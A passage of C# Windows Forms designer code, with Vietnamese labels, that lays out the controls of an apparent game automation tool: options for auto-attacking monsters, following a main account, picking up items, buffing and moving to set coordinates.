		this.checkBoxTudongPT.AutoSize = true;
		this.checkBoxTudongPT.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTudongPT.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxTudongPT.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTudongPT.Location = new System.Drawing.Point(157, 106);
		this.checkBoxTudongPT.Name = "checkBoxTudongPT";
		this.checkBoxTudongPT.Size = new System.Drawing.Size(71, 17);
		this.checkBoxTudongPT.TabIndex = 310;
		this.checkBoxTudongPT.Text = "PT Nhóm";
		this.checkBoxTudongPT.UseVisualStyleBackColor = false;
		this.checkBoxTudongPT.CheckedChanged += new System.EventHandler(checkBoxTudongPT_CheckedChanged);
		this.checkBoxDuongMonBoom.AutoSize = true;
		this.checkBoxDuongMonBoom.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxDuongMonBoom.ForeColor = System.Drawing.Color.Black;
		this.checkBoxDuongMonBoom.Location = new System.Drawing.Point(253, 107);
		this.checkBoxDuongMonBoom.Name = "checkBoxDuongMonBoom";
		this.checkBoxDuongMonBoom.Size = new System.Drawing.Size(72, 17);
		this.checkBoxDuongMonBoom.TabIndex = 327;
		this.checkBoxDuongMonBoom.Text = "ĐM boom";
		this.checkBoxDuongMonBoom.UseVisualStyleBackColor = true;
		this.checkBoxDuongMonBoom.CheckedChanged += new System.EventHandler(checkBoxDuongMonBoom_CheckedChanged);
		this.labelKieudame.AutoSize = true;
		this.labelKieudame.ForeColor = System.Drawing.Color.DarkRed;
		this.labelKieudame.Location = new System.Drawing.Point(300, 69);
		this.labelKieudame.Name = "labelKieudame";
		this.labelKieudame.Size = new System.Drawing.Size(16, 15);
		this.labelKieudame.TabIndex = 326;
		this.labelKieudame.Text = "...";
		this.comboBoxXuongNgua.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxXuongNgua.DropDownWidth = 120;
		this.comboBoxXuongNgua.ForeColor = System.Drawing.Color.Black;
		this.comboBoxXuongNgua.FormattingEnabled = true;
		this.comboBoxXuongNgua.Location = new System.Drawing.Point(90, 30);
		this.comboBoxXuongNgua.Name = "comboBoxXuongNgua";
		this.comboBoxXuongNgua.Size = new System.Drawing.Size(80, 23);
		this.comboBoxXuongNgua.TabIndex = 325;
		this.comboBoxXuongNgua.SelectedIndexChanged += new System.EventHandler(comboBoxXuongNgua_SelectedIndexChanged);
		this.buttonTatcaLuuruong.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.buttonTatcaLuuruong.ForeColor = System.Drawing.Color.Black;
		this.buttonTatcaLuuruong.Location = new System.Drawing.Point(50, 220);
		this.buttonTatcaLuuruong.Name = "buttonTatcaLuuruong";
		this.buttonTatcaLuuruong.Size = new System.Drawing.Size(50, 39);
		this.buttonTatcaLuuruong.TabIndex = 190;
		this.buttonTatcaLuuruong.Text = "Lưu rương";
		this.buttonTatcaLuuruong.UseVisualStyleBackColor = true;
		this.buttonTatcaLuuruong.Click += new System.EventHandler(buttonTatcaLuuruong_Click);
		this.checkBoxDameMacdinh.AutoSize = true;
		this.checkBoxDameMacdinh.ForeColor = System.Drawing.Color.Red;
		this.checkBoxDameMacdinh.Location = new System.Drawing.Point(203, 69);
		this.checkBoxDameMacdinh.Name = "checkBoxDameMacdinh";
		this.checkBoxDameMacdinh.Size = new System.Drawing.Size(103, 19);
		this.checkBoxDameMacdinh.TabIndex = 321;
		this.checkBoxDameMacdinh.Text = "Dame kết hợp";
		this.checkBoxDameMacdinh.UseVisualStyleBackColor = true;
		this.checkBoxDameMacdinh.CheckedChanged += new System.EventHandler(checkBoxDameMacdinh_CheckedChanged);
		this.buttonMorong.BackColor = System.Drawing.SystemColors.Control;
		this.buttonMorong.ForeColor = System.Drawing.Color.Red;
		this.buttonMorong.Location = new System.Drawing.Point(1, 220);
		this.buttonMorong.Name = "buttonMorong";
		this.buttonMorong.Size = new System.Drawing.Size(50, 39);
		this.buttonMorong.TabIndex = 208;
		this.buttonMorong.Text = "Mở rộng";
		this.buttonMorong.UseVisualStyleBackColor = false;
		this.buttonMorong.Click += new System.EventHandler(buttonMorong_Click);
		this.textBoxKhoangCachTheoSau.ForeColor = System.Drawing.Color.Black;
		this.textBoxKhoangCachTheoSau.Location = new System.Drawing.Point(112, 155);
		this.textBoxKhoangCachTheoSau.Name = "textBoxKhoangCachTheoSau";
		this.textBoxKhoangCachTheoSau.Size = new System.Drawing.Size(37, 21);
		this.textBoxKhoangCachTheoSau.TabIndex = 218;
		this.textBoxKhoangCachTheoSau.TextChanged += new System.EventHandler(textBoxKhoangCachTheoSau_TextChanged);
		this.checkBoxTuCastBua.AutoSize = true;
		this.checkBoxTuCastBua.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTuCastBua.ForeColor = System.Drawing.Color.Blue;
		this.checkBoxTuCastBua.Location = new System.Drawing.Point(3, 107);
		this.checkBoxTuCastBua.Name = "checkBoxTuCastBua";
		this.checkBoxTuCastBua.Size = new System.Drawing.Size(92, 19);
		this.checkBoxTuCastBua.TabIndex = 172;
		this.checkBoxTuCastBua.Text = "Bật Buff bùa";
		this.checkBoxTuCastBua.UseVisualStyleBackColor = false;
		this.checkBoxTuCastBua.CheckedChanged += new System.EventHandler(checkBoxTuCastBua_CheckedChanged);
		this.checkBoxTiepCan.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTiepCan.ForeColor = System.Drawing.Color.Red;
		this.checkBoxTiepCan.Location = new System.Drawing.Point(146, 2);
		this.checkBoxTiepCan.Name = "checkBoxTiepCan";
		this.checkBoxTiepCan.Size = new System.Drawing.Size(76, 23);
		this.checkBoxTiepCan.TabIndex = 160;
		this.checkBoxTiepCan.Text = "Tiếp cận ";
		this.checkBoxTiepCan.UseVisualStyleBackColor = false;
		this.checkBoxTiepCan.CheckedChanged += new System.EventHandler(checkBoxTiepCan_CheckedChanged);
		this.checkBoxDanhquai.AutoSize = true;
		this.checkBoxDanhquai.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxDanhquai.ForeColor = System.Drawing.Color.DarkRed;
		this.checkBoxDanhquai.Location = new System.Drawing.Point(3, 81);
		this.checkBoxDanhquai.Name = "checkBoxDanhquai";
		this.checkBoxDanhquai.Size = new System.Drawing.Size(83, 19);
		this.checkBoxDanhquai.TabIndex = 109;
		this.checkBoxDanhquai.Text = "Đánh quái";
		this.checkBoxDanhquai.UseVisualStyleBackColor = false;
		this.checkBoxDanhquai.CheckedChanged += new System.EventHandler(checkBoxDanhquai_CheckedChanged);
		this.buttonUuTien.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.buttonUuTien.ForeColor = System.Drawing.Color.Black;
		this.buttonUuTien.Location = new System.Drawing.Point(260, 31);
		this.buttonUuTien.Name = "buttonUuTien";
		this.buttonUuTien.Size = new System.Drawing.Size(60, 21);
		this.buttonUuTien.TabIndex = 209;
		this.buttonUuTien.Text = "Áp dụng";
		this.buttonUuTien.UseVisualStyleBackColor = true;
		this.buttonUuTien.Click += new System.EventHandler(buttonUuTien_Click);
		this.labelTheoSauAll.AutoSize = true;
		this.labelTheoSauAll.BackColor = System.Drawing.SystemColors.Control;
		this.labelTheoSauAll.Cursor = System.Windows.Forms.Cursors.Hand;
		this.labelTheoSauAll.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.labelTheoSauAll.ForeColor = System.Drawing.Color.Blue;
		this.labelTheoSauAll.Location = new System.Drawing.Point(75, 135);
		this.labelTheoSauAll.Name = "labelTheoSauAll";
		this.labelTheoSauAll.Size = new System.Drawing.Size(76, 13);
		this.labelTheoSauAll.TabIndex = 219;
		this.labelTheoSauAll.Text = "áp dụng tất cả";
		this.labelTheoSauAll.Click += new System.EventHandler(labelTheoSauAll_Click);
		this.buttonLoaitruAccBuff.ForeColor = System.Drawing.Color.Black;
		this.buttonLoaitruAccBuff.Location = new System.Drawing.Point(323, 31);
		this.buttonLoaitruAccBuff.Name = "buttonLoaitruAccBuff";
		this.buttonLoaitruAccBuff.Size = new System.Drawing.Size(64, 21);
		this.buttonLoaitruAccBuff.TabIndex = 175;
		this.buttonLoaitruAccBuff.Text = "Loại trừ";
		this.buttonLoaitruAccBuff.UseVisualStyleBackColor = true;
		this.buttonLoaitruAccBuff.Click += new System.EventHandler(buttonLoaitruAccBuff_Click);
		this.comboBoxNhatdo.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxNhatdo.DropDownWidth = 80;
		this.comboBoxNhatdo.ForeColor = System.Drawing.Color.Black;
		this.comboBoxNhatdo.FormattingEnabled = true;
		this.comboBoxNhatdo.Location = new System.Drawing.Point(252, 159);
		this.comboBoxNhatdo.Name = "comboBoxNhatdo";
		this.comboBoxNhatdo.Size = new System.Drawing.Size(67, 23);
		this.comboBoxNhatdo.TabIndex = 173;
		this.comboBoxNhatdo.SelectedIndexChanged += new System.EventHandler(comboBoxNhatdo_SelectedIndexChanged);
		this.checkBoxNhatdo.AutoSize = true;
		this.checkBoxNhatdo.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxNhatdo.ForeColor = System.Drawing.Color.Black;
		this.checkBoxNhatdo.Location = new System.Drawing.Point(157, 161);
		this.checkBoxNhatdo.Name = "checkBoxNhatdo";
		this.checkBoxNhatdo.Size = new System.Drawing.Size(65, 17);
		this.checkBoxNhatdo.TabIndex = 174;
		this.checkBoxNhatdo.Text = "Nhặt đồ";
		this.checkBoxNhatdo.UseVisualStyleBackColor = true;
		this.checkBoxNhatdo.CheckedChanged += new System.EventHandler(checkBoxNhatdo_CheckedChanged);
		this.comboBoxTheoSau.DropDownWidth = 110;
		this.comboBoxTheoSau.ForeColor = System.Drawing.Color.Black;
		this.comboBoxTheoSau.FormattingEnabled = true;
		this.comboBoxTheoSau.Location = new System.Drawing.Point(4, 153);
		this.comboBoxTheoSau.Name = "comboBoxTheoSau";
		this.comboBoxTheoSau.Size = new System.Drawing.Size(104, 23);
		this.comboBoxTheoSau.TabIndex = 163;
		this.comboBoxTheoSau.SelectedIndexChanged += new System.EventHandler(comboBoxTheoSau_SelectedIndexChanged);
		this.comboBoxTheoSau.MouseDown += new System.Windows.Forms.MouseEventHandler(comboBoxTheoSau_MouseDown);
		this.checkBoxChetnamIm.AutoSize = true;
		this.checkBoxChetnamIm.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxChetnamIm.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxChetnamIm.ForeColor = System.Drawing.Color.Black;
		this.checkBoxChetnamIm.Location = new System.Drawing.Point(292, 6);
		this.checkBoxChetnamIm.Name = "checkBoxChetnamIm";
		this.checkBoxChetnamIm.Size = new System.Drawing.Size(71, 17);
		this.checkBoxChetnamIm.TabIndex = 165;
		this.checkBoxChetnamIm.Text = "Chết nằm";
		this.checkBoxChetnamIm.UseVisualStyleBackColor = false;
		this.checkBoxChetnamIm.CheckedChanged += new System.EventHandler(checkBoxChetnamIm_CheckedChanged);
		this.checkBoxTheoSau.AutoSize = true;
		this.checkBoxTheoSau.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTheoSau.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.checkBoxTheoSau.ForeColor = System.Drawing.Color.Red;
		this.checkBoxTheoSau.Location = new System.Drawing.Point(3, 134);
		this.checkBoxTheoSau.Name = "checkBoxTheoSau";
		this.checkBoxTheoSau.Size = new System.Drawing.Size(71, 17);
		this.checkBoxTheoSau.TabIndex = 217;
		this.checkBoxTheoSau.Text = "Theo sau";
		this.checkBoxTheoSau.UseVisualStyleBackColor = false;
		this.checkBoxTheoSau.CheckedChanged += new System.EventHandler(checkBoxTheoSau_CheckedChanged);
		this.textBoxTimerNgamyBuff.ForeColor = System.Drawing.Color.Black;
		this.textBoxTimerNgamyBuff.Location = new System.Drawing.Point(289, 130);
		this.textBoxTimerNgamyBuff.Name = "textBoxTimerNgamyBuff";
		this.textBoxTimerNgamyBuff.Size = new System.Drawing.Size(31, 21);
		this.textBoxTimerNgamyBuff.TabIndex = 170;
		this.textBoxTimerNgamyBuff.Text = "1000";
		this.textBoxTimerNgamyBuff.TextChanged += new System.EventHandler(textBoxTimerNgamyBuff_TextChanged);
		this.textBoxNgamyBuff.ForeColor = System.Drawing.Color.Black;
		this.textBoxNgamyBuff.Location = new System.Drawing.Point(251, 130);
		this.textBoxNgamyBuff.Name = "textBoxNgamyBuff";
		this.textBoxNgamyBuff.Size = new System.Drawing.Size(35, 21);
		this.textBoxNgamyBuff.TabIndex = 169;
		this.textBoxNgamyBuff.Text = "101";
		this.textBoxNgamyBuff.TextChanged += new System.EventHandler(textBoxNgamyBuff_TextChanged);
		this.checkBoxNgamyBuff.AutoSize = true;
		this.checkBoxNgamyBuff.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxNgamyBuff.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.checkBoxNgamyBuff.ForeColor = System.Drawing.Color.Black;
		this.checkBoxNgamyBuff.Location = new System.Drawing.Point(157, 133);
		this.checkBoxNgamyBuff.Name = "checkBoxNgamyBuff";
		this.checkBoxNgamyBuff.Size = new System.Drawing.Size(94, 17);
		this.checkBoxNgamyBuff.TabIndex = 167;
		this.checkBoxNgamyBuff.Text = "Nga my buff %";
		this.checkBoxNgamyBuff.UseVisualStyleBackColor = false;
		this.checkBoxNgamyBuff.CheckedChanged += new System.EventHandler(checkBoxNgamyBuff_CheckedChanged);
		this.checkBoxTamQuet.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTamQuet.ForeColor = System.Drawing.Color.Blue;
		this.checkBoxTamQuet.Location = new System.Drawing.Point(3, 3);
		this.checkBoxTamQuet.Name = "checkBoxTamQuet";
		this.checkBoxTamQuet.Size = new System.Drawing.Size(121, 22);
		this.checkBoxTamQuet.TabIndex = 162;
		this.checkBoxTamQuet.Text = "Phạm vi tìm đối thủ";
		this.checkBoxTamQuet.UseVisualStyleBackColor = false;
		this.checkBoxTamQuet.CheckedChanged += new System.EventHandler(checkBoxTamQuet_CheckedChanged);
		this.textBoxKhoangCachTiepcan.ForeColor = System.Drawing.Color.Black;
		this.textBoxKhoangCachTiepcan.Location = new System.Drawing.Point(227, 3);
		this.textBoxKhoangCachTiepcan.Name = "textBoxKhoangCachTiepcan";
		this.textBoxKhoangCachTiepcan.Size = new System.Drawing.Size(30, 21);
		this.textBoxKhoangCachTiepcan.TabIndex = 159;
		this.textBoxKhoangCachTiepcan.TextChanged += new System.EventHandler(textBoxKhoangCachTiepcan_TextChanged);
		this.comboBoxUuTien.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxUuTien.DropDownWidth = 80;
		this.comboBoxUuTien.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.comboBoxUuTien.ForeColor = System.Drawing.Color.Black;
		this.comboBoxUuTien.FormattingEnabled = true;
		this.comboBoxUuTien.Location = new System.Drawing.Point(175, 31);
		this.comboBoxUuTien.Name = "comboBoxUuTien";
		this.comboBoxUuTien.Size = new System.Drawing.Size(80, 21);
		this.comboBoxUuTien.TabIndex = 157;
		this.comboBoxUuTien.SelectedIndexChanged += new System.EventHandler(comboBoxUuTien_SelectedIndexChanged);
		this.checkBoxUutienDanhquai.AutoSize = true;
		this.checkBoxUutienDanhquai.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxUutienDanhquai.ForeColor = System.Drawing.Color.Red;
		this.checkBoxUutienDanhquai.Location = new System.Drawing.Point(90, 81);
		this.checkBoxUutienDanhquai.Name = "checkBoxUutienDanhquai";
		this.checkBoxUutienDanhquai.Size = new System.Drawing.Size(79, 19);
		this.checkBoxUutienDanhquai.TabIndex = 117;
		this.checkBoxUutienDanhquai.Text = "Đánh bos";
		this.checkBoxUutienDanhquai.UseVisualStyleBackColor = false;
		this.checkBoxUutienDanhquai.CheckedChanged += new System.EventHandler(checkBoxUutienDanhquai_CheckedChanged);
		this.checkBoxTuve.AutoSize = true;
		this.checkBoxTuve.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxTuve.ForeColor = System.Drawing.Color.Red;
		this.checkBoxTuve.Location = new System.Drawing.Point(3, 31);
		this.checkBoxTuve.Name = "checkBoxTuve";
		this.checkBoxTuve.Size = new System.Drawing.Size(90, 19);
		this.checkBoxTuve.TabIndex = 110;
		this.checkBoxTuve.Text = "Đánh người";
		this.checkBoxTuve.UseVisualStyleBackColor = false;
		this.checkBoxTuve.CheckedChanged += new System.EventHandler(checkBoxTuve_CheckedChanged);
		this.tabPageBang2.Controls.Add(this.buttonNhiepTT);
		this.tabPageBang2.Controls.Add(this.buttonTienSkill);
		this.tabPageBang2.Controls.Add(this.checkBoxTatMuamauTK);
		this.tabPageBang2.Controls.Add(this.checkBoxTienSkill);
		this.tabPageBang2.Controls.Add(this.linkLabel2);
		this.tabPageBang2.Controls.Add(this.checkBoxTuClickNTT);
		this.tabPageBang2.Controls.Add(this.checkBoxVuotAi);
		this.tabPageBang2.Controls.Add(this.comboBoxKieudiCLD);
		this.tabPageBang2.Controls.Add(this.textBoxCaudame);
		this.tabPageBang2.Controls.Add(this.checkBoxTuChayVA);
		this.tabPageBang2.Controls.Add(this.checkBoxCaudame);
		this.tabPageBang2.Controls.Add(this.checkBoxTHPChienLong);
		this.tabPageBang2.Controls.Add(this.comboBoxCLD);
		this.tabPageBang2.Controls.Add(this.checkBoxDenToadoLeave);
		this.tabPageBang2.Controls.Add(this.buttonDiemTapket);
		this.tabPageBang2.Controls.Add(this.checkBoxDiemTapket);
		this.tabPageBang2.Controls.Add(this.checkBoxChienLongdong);
		this.tabPageBang2.Controls.Add(this.buttonLayToado);
		this.tabPageBang2.Controls.Add(this.checkBoxDenToadoALL);
		this.tabPageBang2.Controls.Add(this.textBoxToadoDen);
		this.tabPageBang2.Controls.Add(this.buttonXoaToado);
		this.tabPageBang2.Controls.Add(this.checkBoxDenToadoUser);
		this.tabPageBang2.Location = new System.Drawing.Point(4, 24);
		this.tabPageBang2.Name = "tabPageBang2";
		this.tabPageBang2.Padding = new System.Windows.Forms.Padding(3);
		this.tabPageBang2.Size = new System.Drawing.Size(390, 263);
		this.tabPageBang2.TabIndex = 3;
		this.tabPageBang2.Text = "Bảng 2";
		this.tabPageBang2.UseVisualStyleBackColor = true;
		this.buttonNhiepTT.Location = new System.Drawing.Point(292, 28);
		this.buttonNhiepTT.Name = "buttonNhiepTT";
		this.buttonNhiepTT.Size = new System.Drawing.Size(96, 25);
		this.buttonNhiepTT.TabIndex = 461;
		this.buttonNhiepTT.Text = "Thiết lập";
		this.buttonNhiepTT.UseVisualStyleBackColor = true;
		this.buttonNhiepTT.Click += new System.EventHandler(buttonNhiepTT_Click);
		this.buttonTienSkill.Location = new System.Drawing.Point(202, 164);
		this.buttonTienSkill.Name = "buttonTienSkill";
		this.buttonTienSkill.Size = new System.Drawing.Size(68, 24);
		this.buttonTienSkill.TabIndex = 458;
		this.buttonTienSkill.Text = "Thiết lập";
		this.buttonTienSkill.UseVisualStyleBackColor = true;
		this.buttonTienSkill.Click += new System.EventHandler(buttonTienSkill_Click);
		this.checkBoxTatMuamauTK.AutoSize = true;
		this.checkBoxTatMuamauTK.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTatMuamauTK.Location = new System.Drawing.Point(3, 221);
		this.checkBoxTatMuamauTK.Name = "checkBoxTatMuamauTK";
		this.checkBoxTatMuamauTK.Size = new System.Drawing.Size(260, 19);
		this.checkBoxTatMuamauTK.TabIndex = 212;
		this.checkBoxTatMuamauTK.Text = "Tắt mua máu ở hậu cần khi đánh Tống kim";
		this.checkBoxTatMuamauTK.UseVisualStyleBackColor = true;
		this.checkBoxTatMuamauTK.CheckedChanged += new System.EventHandler(checkBoxTatMuamauTK_CheckedChanged);
		this.checkBoxTienSkill.AutoSize = true;
		this.checkBoxTienSkill.Location = new System.Drawing.Point(3, 164);
		this.checkBoxTienSkill.Name = "checkBoxTienSkill";
		this.checkBoxTienSkill.Size = new System.Drawing.Size(193, 19);
		this.checkBoxTienSkill.TabIndex = 457;
		this.checkBoxTienSkill.Text = "Đánh tiền chiêu (ĐM- TN-TV...)";
		this.checkBoxTienSkill.UseVisualStyleBackColor = true;
		this.checkBoxTienSkill.CheckedChanged += new System.EventHandler(checkBoxTienSkill_CheckedChanged);
		this.linkLabel2.AutoSize = true;
		this.linkLabel2.Location = new System.Drawing.Point(42, 71);
		this.linkLabel2.Name = "linkLabel2";
		this.linkLabel2.Size = new System.Drawing.Size(306, 15);
		this.linkLabel2.TabIndex = 460;
		this.linkLabel2.TabStop = true;
		this.linkLabel2.Text = "=> click vào đây áp dụng tất cả acc vượt ải nhiếp thí trần";
		this.linkLabel2.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(linkLabel2_LinkClicked);
		this.checkBoxTuClickNTT.AutoSize = true;
		this.checkBoxTuClickNTT.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.5f);
		this.checkBoxTuClickNTT.ForeColor = System.Drawing.Color.Blue;
		this.checkBoxTuClickNTT.Location = new System.Drawing.Point(3, 29);
		this.checkBoxTuClickNTT.Name = "checkBoxTuClickNTT";
		this.checkBoxTuClickNTT.Size = new System.Drawing.Size(290, 19);
		this.checkBoxTuClickNTT.TabIndex = 459;
		this.checkBoxTuClickNTT.Text = "Tùy chọn khung giờ click Nhiếp thí trần để vượt ải";
		this.checkBoxTuClickNTT.UseVisualStyleBackColor = true;
		this.checkBoxTuClickNTT.CheckedChanged += new System.EventHandler(checkBoxTuClickNTT_CheckedChanged);
		this.checkBoxVuotAi.AutoSize = true;
		this.checkBoxVuotAi.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxVuotAi.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxVuotAi.ForeColor = System.Drawing.Color.Red;
		this.checkBoxVuotAi.Location = new System.Drawing.Point(213, 55);
		this.checkBoxVuotAi.Name = "checkBoxVuotAi";
		this.checkBoxVuotAi.Size = new System.Drawing.Size(175, 17);
		this.checkBoxVuotAi.TabIndex = 207;
		this.checkBoxVuotAi.Text = "Không đánh quái ải phản dame";
		this.checkBoxVuotAi.UseVisualStyleBackColor = false;
		this.checkBoxVuotAi.CheckedChanged += new System.EventHandler(checkBoxVuotAi_CheckedChanged);
		this.comboBoxKieudiCLD.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxKieudiCLD.DropDownWidth = 60;
		this.comboBoxKieudiCLD.ForeColor = System.Drawing.Color.Black;
		this.comboBoxKieudiCLD.FormattingEnabled = true;
		this.comboBoxKieudiCLD.Location = new System.Drawing.Point(285, 2);
		this.comboBoxKieudiCLD.Name = "comboBoxKieudiCLD";
		this.comboBoxKieudiCLD.Size = new System.Drawing.Size(102, 23);
		this.comboBoxKieudiCLD.TabIndex = 454;
		this.comboBoxKieudiCLD.SelectedIndexChanged += new System.EventHandler(comboBoxKieudiCLD_SelectedIndexChanged);
		this.textBoxCaudame.ForeColor = System.Drawing.Color.Black;
		this.textBoxCaudame.Location = new System.Drawing.Point(202, 194);
		this.textBoxCaudame.Name = "textBoxCaudame";
		this.textBoxCaudame.Size = new System.Drawing.Size(65, 21);
		this.textBoxCaudame.TabIndex = 453;
		this.textBoxCaudame.TextChanged += new System.EventHandler(textBoxCaudame_TextChanged);
		this.checkBoxTuChayVA.AutoSize = true;
		this.checkBoxTuChayVA.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f);
		this.checkBoxTuChayVA.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTuChayVA.Location = new System.Drawing.Point(3, 56);
		this.checkBoxTuChayVA.Name = "checkBoxTuChayVA";
		this.checkBoxTuChayVA.Size = new System.Drawing.Size(202, 17);
		this.checkBoxTuChayVA.TabIndex = 455;
		this.checkBoxTuChayVA.Text = "Tự di chuyển đánh quái maps vượt ải";
		this.checkBoxTuChayVA.UseVisualStyleBackColor = true;
		this.checkBoxTuChayVA.CheckedChanged += new System.EventHandler(checkBoxTuChayVA_CheckedChanged);
		this.checkBoxCaudame.BackColor = System.Drawing.SystemColors.Control;
		this.checkBoxCaudame.ForeColor = System.Drawing.Color.DarkBlue;
		this.checkBoxCaudame.Location = new System.Drawing.Point(4, 187);
		this.checkBoxCaudame.Name = "checkBoxCaudame";
		this.checkBoxCaudame.Size = new System.Drawing.Size(174, 28);
		this.checkBoxCaudame.TabIndex = 452;
		this.checkBoxCaudame.Text = "Chạy câu dame, bán kính";
		this.checkBoxCaudame.UseVisualStyleBackColor = false;
		this.checkBoxCaudame.CheckedChanged += new System.EventHandler(checkBoxCaudame_CheckedChanged);
		this.checkBoxTHPChienLong.AutoSize = true;
		this.checkBoxTHPChienLong.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxTHPChienLong.ForeColor = System.Drawing.Color.Black;
		this.checkBoxTHPChienLong.Location = new System.Drawing.Point(230, 5);
		this.checkBoxTHPChienLong.Name = "checkBoxTHPChienLong";
		this.checkBoxTHPChienLong.Size = new System.Drawing.Size(59, 17);
		this.checkBoxTHPChienLong.TabIndex = 272;
		this.checkBoxTHPChienLong.Text = "Kiểu đi";
		this.checkBoxTHPChienLong.UseVisualStyleBackColor = true;
		this.checkBoxTHPChienLong.CheckedChanged += new System.EventHandler(checkBoxTHPChienLong_CheckedChanged);
		this.comboBoxCLD.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxCLD.DropDownWidth = 60;
		this.comboBoxCLD.ForeColor = System.Drawing.Color.Black;
		this.comboBoxCLD.FormattingEnabled = true;
		this.comboBoxCLD.Location = new System.Drawing.Point(138, 2);
		this.comboBoxCLD.Name = "comboBoxCLD";
		this.comboBoxCLD.Size = new System.Drawing.Size(87, 23);
		this.comboBoxCLD.TabIndex = 206;
		this.comboBoxCLD.SelectedIndexChanged += new System.EventHandler(comboBoxCLD_SelectedIndexChanged);
		this.checkBoxDenToadoLeave.AutoSize = true;
		this.checkBoxDenToadoLeave.ForeColor = System.Drawing.Color.Black;
		this.checkBoxDenToadoLeave.Location = new System.Drawing.Point(15, 114);
		this.checkBoxDenToadoLeave.Name = "checkBoxDenToadoLeave";
		this.checkBoxDenToadoLeave.Size = new System.Drawing.Size(229, 19);
		this.checkBoxDenToadoLeave.TabIndex = 271;
		this.checkBoxDenToadoLeave.Text = "Tìm ac chính sau khi đến tọa độ xong";
		this.checkBoxDenToadoLeave.UseVisualStyleBackColor = true;
		this.checkBoxDenToadoLeave.CheckedChanged += new System.EventHandler(checkBoxDenToadoLeave_CheckedChanged);
		this.buttonDiemTapket.Location = new System.Drawing.Point(292, 133);
		this.buttonDiemTapket.Name = "buttonDiemTapket";
		this.buttonDiemTapket.Size = new System.Drawing.Size(77, 28);
		this.buttonDiemTapket.TabIndex = 209;
		this.buttonDiemTapket.Text = "Thiết lập";
		this.buttonDiemTapket.UseVisualStyleBackColor = true;
		this.buttonDiemTapket.Click += new System.EventHandler(buttonDiemTapket_Click);
		this.checkBoxDiemTapket.ForeColor = System.Drawing.Color.Red;
		this.checkBoxDiemTapket.Location = new System.Drawing.Point(281, 89);
		this.checkBoxDiemTapket.Name = "checkBoxDiemTapket";
		this.checkBoxDiemTapket.Size = new System.Drawing.Size(103, 47);
		this.checkBoxDiemTapket.TabIndex = 208;
		this.checkBoxDiemTapket.Text = "Đi đến điểm\r\n tập kết khác";
		this.checkBoxDiemTapket.UseVisualStyleBackColor = true;
		this.checkBoxDiemTapket.CheckedChanged += new System.EventHandler(checkBoxDiemTapket_CheckedChanged);
		this.checkBoxChienLongdong.AutoSize = true;
		this.checkBoxChienLongdong.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f);
		this.checkBoxChienLongdong.ForeColor = System.Drawing.Color.Red;
		this.checkBoxChienLongdong.Location = new System.Drawing.Point(3, 4);
		this.checkBoxChienLongdong.Name = "checkBoxChienLongdong";
		this.checkBoxChienLongdong.Size = new System.Drawing.Size(137, 17);
		this.checkBoxChienLongdong.TabIndex = 205;
		this.checkBoxChienLongdong.Text = "Đánh Chiến Long động";
		this.checkBoxChienLongdong.UseVisualStyleBackColor = true;
		this.checkBoxChienLongdong.CheckedChanged += new System.EventHandler(checkBoxChienLongdong_CheckedChanged);
		this.buttonLayToado.Location = new System.Drawing.Point(202, 89);
		this.buttonLayToado.Name = "buttonLayToado";
		this.buttonLayToado.Size = new System.Drawing.Size(37, 23);
		this.buttonLayToado.TabIndex = 260;
		this.buttonLayToado.Text = "Lấy";
		this.buttonLayToado.UseVisualStyleBackColor = true;
		this.buttonLayToado.Click += new System.EventHandler(buttonLayToado_Click);
		this.checkBoxDenToadoALL.AutoCheck = false;
		this.checkBoxDenToadoALL.AutoSize = true;
		this.checkBoxDenToadoALL.ForeColor = System.Drawing.Color.Black;
		this.checkBoxDenToadoALL.Location = new System.Drawing.Point(15, 139);
		this.checkBoxDenToadoALL.Name = "checkBoxDenToadoALL";
		this.checkBoxDenToadoALL.Size = new System.Drawing.Size(252, 19);
		this.checkBoxDenToadoALL.TabIndex = 258;
		this.checkBoxDenToadoALL.Text = "Áp dụng đến tọa độ tất cả (luôn  máy phụ)";
		this.checkBoxDenToadoALL.UseVisualStyleBackColor = true;
		this.checkBoxDenToadoALL.CheckedChanged += new System.EventHandler(checkBoxDenToadoALL_CheckedChanged);
		this.textBoxToadoDen.BackColor = System.Drawing.Color.White;
		this.textBoxToadoDen.ForeColor = System.Drawing.Color.Black;
		this.textBoxToadoDen.Location = new System.Drawing.Point(131, 89);
		this.textBoxToadoDen.Name = "textBoxToadoDen";
